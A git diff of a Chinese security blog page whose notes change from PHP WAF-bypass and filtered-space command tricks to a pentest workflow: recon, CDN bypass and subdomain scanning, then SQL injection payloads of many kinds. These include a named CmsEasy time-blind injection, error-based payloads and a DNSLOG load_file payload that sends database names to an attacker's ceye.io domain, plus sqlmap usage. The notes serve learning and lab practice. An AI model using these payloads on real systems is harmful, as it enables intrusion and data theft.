@@ -47,15 +47,17 @@
   };
 </script>
 
-  <meta name="description" content="PHP字符串解析漏洞利用PHP的字符串解析特性Bypass我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：&#x2F;?foo=bar变成Array([foo] =&amp;gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，&#x2F;?%20news[id%00=42会转换为Array([news_id] =&amp;gt; 42)。">
+  <meta name="description" content="基本渗透流程信息搜集whois查询注册人信息和邮箱,去google或者其他平台搜索敏感信息或者根据信息生成字典准备爆破.绕过cdn内容分发网络 检测是否有cdn先检测网站是否使用cdn,可以使用多地ping看ip是否唯一">
 <meta property="og:type" content="article">
 <meta property="og:title" content="笔记">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;14&#x2F;%E7%AC%94%E8%AE%B0&#x2F;index.html">
 <meta property="og:site_name" content="NoObject&#39;s blog">
-<meta property="og:description" content="PHP字符串解析漏洞利用PHP的字符串解析特性Bypass我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：&#x2F;?foo=bar变成Array([foo] =&amp;gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，&#x2F;?%20news[id%00=42会转换为Array([news_id] =&amp;gt; 42)。">
+<meta property="og:description" content="基本渗透流程信息搜集whois查询注册人信息和邮箱,去google或者其他平台搜索敏感信息或者根据信息生成字典准备爆破.绕过cdn内容分发网络 检测是否有cdn先检测网站是否使用cdn,可以使用多地ping看ip是否唯一">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-09-08T11:19:22.740Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;14&#x2F;%E7%AC%94%E8%AE%B0&#x2F;wappalyzer.png">
+<meta property="og:updated_time" content="2020-09-15T16:55:20.435Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;14&#x2F;%E7%AC%94%E8%AE%B0&#x2F;wappalyzer.png">
 
 <link rel="canonical" href="http://yoursite.com/2019/12/14/%E7%AC%94%E8%AE%B0/">
 
@@ -216,7 +218,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-08 19:19:22" itemprop="dateModified" datetime="2020-09-08T19:19:22+08:00">2020-09-08</time>
+                <time title="修改时间：2020-09-16 00:55:20" itemprop="dateModified" datetime="2020-09-16T00:55:20+08:00">2020-09-16</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -244,79 +246,252 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="PHP字符串解析漏洞"><a href="#PHP字符串解析漏洞" class="headerlink" title="PHP字符串解析漏洞"></a>PHP字符串解析漏洞</h1><p><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><a id="more"></a>
+        <h1 id="基本渗透流程"><a href="#基本渗透流程" class="headerlink" title="基本渗透流程"></a>基本渗透流程</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p>注册人信息和邮箱,去google或者其他平台搜索敏感信息或者根据信息生成字典准备爆破.</p><h3 id="绕过cdn"><a href="#绕过cdn" class="headerlink" title="绕过cdn"></a>绕过cdn</h3><p>内容分发网络 </p><h4 id="检测是否有cdn"><a href="#检测是否有cdn" class="headerlink" title="检测是否有cdn"></a>检测是否有cdn</h4><p>先检测网站是否使用cdn,可以使用多地ping看ip是否唯一</p><a id="more"></a>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/news.php?%20news[id%00=42&quot;+AND+1=0–</span><br></pre></td></tr></table></figure>
 
-<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
-<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
 <blockquote>
-<p>1.删除空白符</p>
+<p><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/" target="_blank" rel="noopener">http://ce.cloud.360.cn/</a> </p>
+</blockquote>
+<p>或者用nslookup进行检测</p>
+<h4 id="查找真实ip"><a href="#查找真实ip" class="headerlink" title="查找真实ip"></a>查找真实ip</h4><h5 id="查询历史DNS记录"><a href="#查询历史DNS记录" class="headerlink" title="查询历史DNS记录"></a>查询历史DNS记录</h5><blockquote>
+<p><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a> ###DNS查询<br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> ###微步在线<br><a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a> ###在线域名信息查询<br><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a> ###DNS、IP等查询<br><a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener">https://tools.ipip.net/cdn.php</a> ###CDN查询IP </p>
+<p> 利用<a href="https://securitytrails.com/" target="_blank" rel="noopener">SecurityTrails</a>平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。 </p>
+</blockquote>
+<h5 id="查询子域名"><a href="#查询子域名" class="headerlink" title="查询子域名"></a>查询子域名</h5><blockquote>
+<p>微步在线(<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>) </p>
+<p>Dnsdb查询法。(<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>) </p>
+<p>Google 搜索  例如: site:baidu.com -www </p>
+<p>各种子域名扫描器  如:<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p>
+</blockquote>
+<h5 id="网络空间引擎搜索法"><a href="#网络空间引擎搜索法" class="headerlink" title="网络空间引擎搜索法"></a>网络空间引擎搜索法</h5><p>如fofa,shodan查找网站相关内容,有可能有真实ip</p>
+<p>还有许多其他方法</p>
+<h4 id="查子域名-c段-旁站"><a href="#查子域名-c段-旁站" class="headerlink" title="查子域名,c段,旁站"></a>查子域名,c段,旁站</h4><blockquote>
+<p>收集C段内部属于目标的ip </p>
+<p>更多的探测主机目标资产 </p>
+<p>旁站：与这个网站在同一个服务器上面的网站。寻找安全薄弱的网站。</p>
+</blockquote>
+<p>子域名扫描工具:<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p>
+<p>c段扫描: nmap、masscan、zenmap和webscancc </p>
+<h3 id="服务器相关信息"><a href="#服务器相关信息" class="headerlink" title="服务器相关信息"></a>服务器相关信息</h3><p>获得网站和服务器信息可以用wappalyzer插件</p>
+<p><img src="/2019/12/14/%E7%AC%94%E8%AE%B0/wappalyzer.png" alt></p>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>一个站点可能存在的漏洞：sql注入、万能密码（sql注入）、弱口令，敏感信息泄漏，csrf，url跳转，xss，命令执行，越权访问，未授权访问，短信轰炸，xxe，ssti，ssrf，文件包含，反序列化漏洞，文件上传漏洞，解析漏洞等</p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><blockquote>
+<p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 </p>
+</blockquote>
+<h4 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h4><h5 id="按注入点类型分类"><a href="#按注入点类型分类" class="headerlink" title="按注入点类型分类"></a>按注入点类型分类</h5><h6 id="一-数字型注入"><a href="#一-数字型注入" class="headerlink" title="一:数字型注入"></a>一:数字型注入</h6><blockquote>
+<p>在 Web 端大概是 <a href="http://xxx.com/news.php?id=1" target="_blank" rel="noopener">http://xxx.com/news.php?id=1</a> 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code>。组合出来的sql注入语句为：select * from news where id=1 and 1=1 </p>
+</blockquote>
+<h6 id="二-字符型注入"><a href="#二-字符型注入" class="headerlink" title="二:字符型注入"></a>二:字符型注入</h6><blockquote>
+<p>在 Web 端大概是 <a href="http://xxx.com/news.php?name=admin" target="_blank" rel="noopener">http://xxx.com/news.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name=&#39;admin&#39;</code>。注意多了引号。组合出来的sql注入语句为：select * from news where chr=’admin’ and 1=1 ‘ ‘</p>
+<p>闭合单引号chr=’admin’ union select 1,2,3,4 and ‘1’=’1  ====&gt;  chr=’admin’(闭合前面单引号) union select 1,2,3,4 and ‘1’=’1’</p>
+</blockquote>
+<h6 id="三-搜索型注入点"><a href="#三-搜索型注入点" class="headerlink" title="三:搜索型注入点"></a>三:搜索型注入点</h6><blockquote>
+<p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code>。</p>
+<p>组合出来的sql注入语句为：select * from news where search like ‘%测试 %’ and ‘%1%’=’%1%’</p>
+<p>测试%’ union select 1,2,3,4 and ‘%’=’</p>
+</blockquote>
+<h5 id="按数据注入方式分类"><a href="#按数据注入方式分类" class="headerlink" title="按数据注入方式分类"></a>按数据注入方式分类</h5><h6 id="一-get注入"><a href="#一-get注入" class="headerlink" title="一:get注入"></a>一:get注入</h6><blockquote>
+<p>注入点在url中  如: <code>http://xxx.com/news.php?id=1</code>  </p>
+</blockquote>
+<h6 id="二-post注入"><a href="#二-post注入" class="headerlink" title="二:post注入"></a>二:post注入</h6><blockquote>
+<p>通过post方式数据，注入点在post数据中</p>
+</blockquote>
+<h6 id="三-cookie注入"><a href="#三-cookie注入" class="headerlink" title="三:cookie注入"></a>三:cookie注入</h6><blockquote>
+<p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。 </p>
+</blockquote>
+<h6 id="四-HTTP头注入"><a href="#四-HTTP头注入" class="headerlink" title="四:HTTP头注入"></a>四:HTTP头注入</h6><blockquote>
+<p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。 </p>
+</blockquote>
+<h5 id="按执行类型分类"><a href="#按执行类型分类" class="headerlink" title="按执行类型分类"></a>按执行类型分类</h5><h6 id="一-基于布尔的盲注"><a href="#一-基于布尔的盲注" class="headerlink" title="一:基于布尔的盲注"></a>一:基于布尔的盲注</h6><blockquote>
+<p>可以根据返回页面判断条件真假的注入。 </p>
+</blockquote>
+<p>页面回显结果可以判断执行结果是true和false</p>
+<p>常用函数</p>
+<blockquote>
+<p>Length（）函数 返回字符串的长度<br>Substr（）截取字符串<br>Ascii（）返回字符的ascii码<br>sleep(n)：将程序挂起一段时间 n为n秒<br>if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</p>
+</blockquote>
+<p>如sqli-labs中less-5</p>
+<blockquote>
+<p><a href="http://127.0.0.1:9000/sqli-labs-master/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1:9000/sqli-labs-master/Less-5/?id=1&#39;</a> and length(database())&gt;7 %23    判断长度</p>
+<p><a href="http://127.0.0.1:9000/sqli-labs-master/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1:9000/sqli-labs-master/Less-5/?id=1&#39;</a> and substr(database(),1,1)&gt;’r’ %23  猜测数据库名</p>
+</blockquote>
+<h6 id="二-基于时间的盲注"><a href="#二-基于时间的盲注" class="headerlink" title="二:基于时间的盲注"></a>二:基于时间的盲注</h6><blockquote>
+<p>不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 </p>
+</blockquote>
+<p>如  CmsEasy V3.X.X  中时间注入</p>
+<p>SQL注入点位置：<a href="http://IP:/celive/js/include.php?cmseasylive=1111&amp;departmentid=0" target="_blank" rel="noopener">http://IP:/celive/js/include.php?cmseasylive=1111&amp;departmentid=0</a></p>
+<p>下面是include.php的部分代码</p>
+<blockquote>
+<p>  if (isset($_GET[‘departmentid’])) {</p>
+<p>​    $departmentid = $_GET[‘departmentid’];</p>
+<p>​    $activity_sql = “SELECT <code>id</code> FROM <code>&quot;.$config[&#39;prefix&#39;].&quot;activity</code> WHERE  <code>departmentid</code>=’”.$departmentid.”‘ AND <code>operatorid</code>=’”.$operatorid.”‘“;     </p>
+<p>​    $onlinelink2 = ‘‘;</p>
+<p>​    @$result2 = $db-&gt;my_fetch_array($activity_sql);</p>
+</blockquote>
+<p>分析代码，可以输入到参数departmentid的值会传递到$activity_sql去查询，此处没有做过滤，但也没有回显查询结果和爆错语句，因此可以尝试使用字符型的时间盲注。</p>
+<p>基本payload </p>
+<blockquote>
+<p>include.php?cmseasylive=1111&amp;departmentid=0’ and sleep(5) AND ‘1’=’1 </p>
+<p>include.phpcmseasylive=1111&amp;departmentid=0’+and+if((%s)+regexp’^%s’,sleep(5),0)+and+’1’=’1’</p>
+</blockquote>
+<h6 id="三-基于报错的注入"><a href="#三-基于报错的注入" class="headerlink" title="三:基于报错的注入"></a>三:基于报错的注入</h6><blockquote>
+<p>页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 </p>
+</blockquote>
+<p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。 </p>
+<p>常用的报错注入</p>
+<p>1:Duplicate entry报错</p>
+<blockquote>
+<p>一句话概括就是多次查询插入重复键值导致count报错从而在报错信息中带入了敏感信息。</p>
+<p>关键是查询时会建立临时表存储数据，不存在键值就插入，group by使插入前rand()会再执行一次，存在就直接值加1 ,造成抛出主键冗余的错误</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,count(*),concat(version(),floor(rand(0)*2))x from information_schema.columns group by x;–+</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>version()可以替换为需要查询的信息。</p>
+<p>简化语句：</p>
+<p>union select 1,2,count(*) from information_schema.columns group by concat(version(),floor(rand(0)*2));–+</p>
+</blockquote>
+<p>2:Xpath报错</p>
+<blockquote>
+<p>updatexml():对xml进行查询和修改     and updatexml(1,concat(0x26,(version()),0x26),1); </p>
+<p>extractvalue():对xml进行查询和修改   and (extractvalue(1,concat(0x26,(version()),0x26))); </p>
+<p>都是最大爆32位。 </p>
+</blockquote>
+<p>3:整形溢出报错</p>
+<p>Mysql&gt;5.5.5</p>
+<p>主要函数：</p>
+<p>exp(x):计算e的x次方</p>
+<blockquote>
+<p>Payload: and (EXP(~(select * from(select version())a)));</p>
+</blockquote>
+<p>Exp()超过710会产生溢出。</p>
+<p>将0按位取反就会返回“18446744073709551615”，而函数执行成功会返回0，所以将成功执行的函数取反就会得到最大的无符号BIGINT值，从而造成报错。</p>
+<h6 id="四-堆叠注入"><a href="#四-堆叠注入" class="headerlink" title="四:堆叠注入"></a>四:堆叠注入</h6><p> PHP中mysqli_multi_query()函数 </p>
+<blockquote>
+<p>可以同时执行多条语句的执行时的注入。语句之间以分号(;)隔开。而堆叠查询注入攻击就是利用此特点，在第二条语句中构造自己要执行的语句。</p>
+<p>1’;show databases;# </p>
+</blockquote>
+<h6 id="五-DNSLOG注入"><a href="#五-DNSLOG注入" class="headerlink" title="五:DNSLOG注入"></a>五:DNSLOG注入</h6><blockquote>
+<p>局限于Windows环境下（UNC路径）</p>
+<p>Mysql版本&gt;=5.5.53就要检查Secure_file_priv这个全局变量是否为空（若为NULL，则不可用)</p>
+</blockquote>
+<p>首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了 </p>
+<blockquote>
+<p>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息,简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</p>
+</blockquote>
+<p>在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，这时候就要用到我们的DNSlog注入。 </p>
+<p>平台推荐</p>
+<blockquote>
+<p><a href="http://www.dnslog.cn" target="_blank" rel="noopener">http://www.dnslog.cn</a></p>
+<p><a href="http://admin.dnslog.link" target="_blank" rel="noopener">http://admin.dnslog.link</a></p>
+<p><a href="http://ceye.io" target="_blank" rel="noopener">http://ceye.io</a></p>
+</blockquote>
+<p>MySql的盲注时，可以利用内置函数load_file()来完成DNSLOG。load_file()不仅能够加载本地文件，同时也能对诸如\<a href="http://www.test.com/" target="_blank" rel="noopener">www.test.com</a>这样的URL发起请求。</p>
+<p>show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
+<p>1、当secure_file_priv为空，就可以读取磁盘的目录。</p>
+<p>2、当secure_file_priv为G:\，就可以读取G盘的文件。</p>
+<p>3、当secure_file_priv为null，load_file就不能加载文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;\\\\afanti.xxxx.ceye.io\\aaa&apos;);</span><br></pre></td></tr></table></figure>
+
+<p>注意：load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows的一个小Tips——UNC路径。</p>
+<p>以下是百度的UNC路径的解释</p>
+<p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\sss.xxx\test\</span><br></pre></td></tr></table></figure>
+
+<p>这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。</p>
+<p>以sql-labs第五关：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxx.ceye.io\\abc&apos;))),1,0)-- -+</span><br></pre></td></tr></table></figure>
+
+<h6 id="六-宽字节注入"><a href="#六-宽字节注入" class="headerlink" title="六:宽字节注入"></a>六:宽字节注入</h6><p>在使用PHP连接MySQL的时候，当设置“set<br>character_set_client = gbk”时会导致一个编码转换的问题，也就是我们熟悉的宽字节注入，当存在宽字节注入的时候，注入参数里带入％ DF％27，即可把（％5C）吃掉，举个例子。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.com/index.php?id=1</span><br></pre></td></tr></table></figure>
+
+<p>当提交</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and 1=1%23</span><br></pre></td></tr></table></figure>
+
+<p>时，MySQL的运行的SQL语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where  id =&apos;1\&apos; and 1=1#&apos;</span><br></pre></td></tr></table></figure>
+
+<p>很明显这是没有注入成功的，而当我们提交</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%df&apos; and 1=1%231</span><br></pre></td></tr></table></figure>
+
+<p>MySQL的运行的SQL语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id =&apos;1運&apos; and 1=1#&apos;1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们这里的宽字节注入是利用的MySQL的一个特性，MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。这就是MySQL的的特性，因为GBK是多字节编码，他认为两个字节代表一个汉字，所以％DF和后面的\也就是％5c中变成了一个汉字“运”，而单引号逃逸了出来。</p>
+</blockquote>
+<h6 id="七-sql正则注入"><a href="#七-sql正则注入" class="headerlink" title="七:sql正则注入"></a>七:sql正则注入</h6><p> 通俗点就是常用的筛选语句被过滤的时候使用like 或regexp进行匹配，regexp支持正则表达式匹配 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如$query=&quot;select user from user where user=&apos;$_POST[username]&apos; and passwd=&apos;$_POST[passwd]&apos;&quot;;  </span><br><span class="line"></span><br><span class="line">payload username=\&amp;passwd=||passwd/**/REGEXP/**/&quot;^d&quot;;%00</span><br></pre></td></tr></table></figure>
+
+<h4 id="sqlmap工具使用"><a href="#sqlmap工具使用" class="headerlink" title="sqlmap工具使用"></a>sqlmap工具使用</h4><blockquote>
+<p><a href="https://xz.aliyun.com/t/3010" target="_blank" rel="noopener">https://xz.aliyun.com/t/3010</a></p>
+<p><a href="https://xz.aliyun.com/t/3011" target="_blank" rel="noopener">https://xz.aliyun.com/t/3011</a></p>
 </blockquote>
 <blockquote>
-<p>2.将某些字符转换为下划线（包括空格）</p>
+<p>SQLmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Acess，IBM DB2，SQLLite，Firebird，Sybase和SAP MaxDB……SQLmap采用几种独特的SQL注入技术，分别是盲推理SQL注入，UNION查询SQL注入，对查询和盲注。其广泛的功能和选项包括数据库指纹，枚举，数据库提取，访问目标文件系统，并在获取完全操作权限时实行任意命令。</p>
 </blockquote>
-<p>我的理解：<br>假如waf不允许num变量传递字母：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话</span><br></pre></td></tr></table></figure>
-
-<p>那么我们可以在num前加个空格：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/index.php? num = aaaa</span><br></pre></td></tr></table></figure>
-
-<p>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
-<h1 id="php别名"><a href="#php别名" class="headerlink" title="php别名"></a>php别名</h1><blockquote>
-<p>php2, php3, php4, php5, phps, pht, phtm, phtml </p>
+<p>当给Sqlmap一个url跑的时候，它会：</p>
+<p>1.判断注入时选择的参数</p>
+<p>2.判断识别出使用的那种数据库</p>
+<p>3.判断注入时使用何种sql注入技术来进行注入</p>
+<p>4.根据用户的选择需要，获取相应的需要的数据</p>
+<h5 id="sqlmap常用参数"><a href="#sqlmap常用参数" class="headerlink" title="sqlmap常用参数"></a>sqlmap常用参数</h5><blockquote>
+<p>-u : 指定目标URL，sql注入点<br>–cookie : 当前会话的cookie值<br>–level: 探测等级  http cookie在2级时可以检测   HTTP user-Agent/Referer在3级时就会检测<br>-r:sqlmap可以从一个文本文件中获取<code>HTTP</code>请求，这样就可以跳过设置一些其他参数<br>–tamper: sqlmap的绕过脚本  可以使用–identify-waf对一些网站是否有安全防护进行试探 </p>
 </blockquote>
-<h1 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h1><blockquote>
-<p>利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。<br>所以当我们用ᴬdmin注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成Admin，我们用ᴬdmin进行登录，可以看到index页面的username变成了Admin，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可。 </p>
-</blockquote>
-<h1 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS</span><br></pre></td></tr></table></figure>
+<h5 id="sqlmap各种注入点方法"><a href="#sqlmap各种注入点方法" class="headerlink" title="sqlmap各种注入点方法"></a>sqlmap各种注入点方法</h5><h6 id="get注入点方法"><a href="#get注入点方法" class="headerlink" title="get注入点方法"></a>get注入点方法</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; //这个URL必须含？</span><br></pre></td></tr></table></figure>
 
-<h1 id="GIT恢复"><a href="#GIT恢复" class="headerlink" title="GIT恢复"></a>GIT恢复</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git log --reflog     </span><br><span class="line">git reset --hard  xxxxxxxxxxxxx           (版本号)</span><br></pre></td></tr></table></figure>
-
-<p>先git log –reflog查看一下 可疑文件 然后在恢复他</p>
-<h1 id="JSON转义字符绕过"><a href="#JSON转义字符绕过" class="headerlink" title="JSON转义字符绕过"></a>JSON转义字符绕过</h1><p> json使支持unicode编码的，所以可以用unicode代替关键字 </p>
-<p> <code>\uXXXX</code>可以在JSON中转义字符，例如<code>A</code>，<code>\u0041</code>等效 </p>
-<h1 id="路径穿越漏洞"><a href="#路径穿越漏洞" class="headerlink" title="路径穿越漏洞"></a>路径穿越漏洞</h1><p>如果应用程序使用用户可控制的数据，以危险的方式访问位于应用服务器或其它后端文件系统的文件或目录，就会出现路径遍历。攻击者可以将路径遍历序列放入文件名内，向上回溯，从而访问服务器上的任何文件</p>
-<h1 id="上传后门"><a href="#上传后门" class="headerlink" title="上传后门"></a>上传后门</h1><p>通过参数上传后门， <code>%09</code>是水平制表符，必须添加，不然后台会把我们的后门当做目录去解析。 </p>
-<h1 id="Nginx重要文件位置"><a href="#Nginx重要文件位置" class="headerlink" title="Nginx重要文件位置"></a>Nginx重要文件位置</h1><blockquote>
-<p>配置文件存放目录：/etc/nginx </p>
-<p>主配置文件：/etc/nginx/conf/nginx.conf</p>
-<p>管理脚本：/usr/lib64/systemd/system/nginx.service </p>
-<p>模块：/usr/lisb64/nginx/modules </p>
-<p>应用程序：/usr/sbin/nginx </p>
-<p>程序默认存放位置：/usr/share/nginx/html </p>
-<p>日志默认存放位置：/var/log/nginx </p>
-<p>配置文件目录为：/usr/local/nginx/conf/nginx.conf </p>
+<h6 id="post注入点方法"><a href="#post注入点方法" class="headerlink" title="post注入点方法"></a>post注入点方法</h6><blockquote>
+<p>抓包，放到txt文件，使用sqlmap -r *.txt实现post注入</p>
+<p>使用文件时，制定某特定选项注入的方法,在文件中，将指定的参数值设为星号（*）</p>
+<p>或者</p>
+<p>sqlmap -u “url” –data “xxx=xxx&amp;xxx=xxx”</p>
 </blockquote>
-<h1 id="IDNA"><a href="#IDNA" class="headerlink" title="IDNA"></a>IDNA</h1><p>在unicode中字符℀(U+2100)，当IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。 </p>
-<h1 id="命令中空格被过滤的解决方法"><a href="#命令中空格被过滤的解决方法" class="headerlink" title="命令中空格被过滤的解决方法"></a>命令中空格被过滤的解决方法</h1><p>linux</p>
-<blockquote>
-<p>{cat,flag.txt}<br>cat${IFS}flag.txt<br>cat$IFS$9flag.txt<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt<br>kg=$’\x20flag.txt’&amp;&amp;cat$kg<br>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</p>
+<h6 id="cookie注入点方法"><a href="#cookie注入点方法" class="headerlink" title="cookie注入点方法"></a>cookie注入点方法</h6><blockquote>
+<p>sqlmap -u “url” –cookie “xxx” –level 2 //这里的URL去掉？及其后的内容，并将它们放在cookie的内容里面</p>
 </blockquote>
-<p>windows下</p>
-<blockquote>
-<p>type.\flag.txt<br>type,flag.txt<br>echo,123456</p>
